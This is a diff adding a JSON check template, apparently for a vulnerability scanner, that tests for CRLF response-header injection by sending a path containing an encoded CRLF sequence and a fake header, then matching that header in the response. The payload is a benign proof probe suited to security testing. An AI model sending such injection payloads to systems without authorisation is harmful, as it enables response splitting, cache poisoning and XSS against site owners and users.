@@ -1,0 +1,27 @@
+{
+  "name": "web/CRLF response-header injection",
+  "description": "[high] Proves CRLF response-header injection: %0d%0a inside the path splits a new X-Crlproof header into the response (leads to cache/queue poisoning and XSS via injected headers). Keywords: crlf injection response splitting header injection http. ctrl: benign path adds no header -> not falsified. base_url = site root.",
+  "cwe": "CWE-113",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/%0d%0aX-Crlproof%3A%201"
+    }
+  },
+  "conditions": [
+    {
+      "type": "header_regex",
+      "request": "payload",
+      "pattern": "x-crlproof",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "b7c273a7e873",
+  "created": "2026-11-05T18:01:37.085987+00:00",
+  "last_used": "2026-11-05T18:01:37.085987+00:00"
+}
